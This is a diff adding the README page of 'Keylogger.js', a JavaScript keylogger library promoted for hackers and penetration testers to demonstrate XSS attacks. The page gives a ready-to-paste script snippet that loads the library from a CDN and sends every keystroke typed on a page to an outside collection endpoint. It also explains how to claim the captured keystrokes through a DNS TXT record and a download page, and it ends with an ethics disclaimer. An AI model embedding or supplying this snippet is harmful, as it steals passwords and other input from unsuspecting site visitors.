@@ -1,0 +1,30 @@
+Keylogger.js is a ready-to-use keylogging library designed for hackers, security researchers, and penetration testers. It’s a lightweight JavaScript script that can be easily embedded in any website to track user input, making it an excellent tool for demonstrating the risks of Cross-Site Scripting (XSS) vulnerabilities.
+
+The script is simple to use and highly versatile, allowing you to monitor user activity on websites while focusing on ethical applications. Keylogger.js is an excellent resource for anyone looking to learn more about web security, ethical hacking, or vulnerability exploitation.
+
+## ./how-to-use-keylogger-js
+This page also features a webhook that can be used to download the captured keystrokes. To use it:
+- To integrate with your domain, [add the following TXT DNS record](https://www.id123.io/knowledgebase/adding-a-txt-record-to-a-dns-server/) to your domain's settings:
+```txt
+i-love-mihnea-dev
+```
+- Embed and initialize Keylogger.js in your HTML:
+```html
+<script>
+    import Keylogger from 'https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js';
+    const keylogger = new Keylogger('https://mihnea.dev/api/keylogger-js', false);
+    console.log('Keylogger initialized:', keylogger);
+</script>
+```
+- Search for your domain in [`./entries`](#entries) and download the captured key strokes.
+
+> **IMORTANT: I'm using [Vercel's FREE Blob](https://vercel.com/docs/storage/vercel-blob) to store data, and there are some limitations to it!** Moreover, I am also deleting the data every once in a while, so make sure to download it as soon as possible.
+
+## ./learn-more
+If you want to dive deeper into how Keylogger.js works or explore its applications, check out these resources:
+- [GitHub](https://github.com/mihneamanolache/keylogger.js/tree/main)
+- [NPM](https://www.npmjs.com/package/@mihnea.dev/keylogger.js)
+- [Keylogger.js - How to Exploit XSS Using Keylogging](https://mihnea.hashnode.dev/how-to-exploit-xss-using-keylogger-js)
+
+## ./disclaimer 󰀦
+Keylogger.js is a tool designed for ethical hacking and security research. Always ensure that you have explicit permission before deploying it on any application or website. Unauthorized use is illegal and unethical.
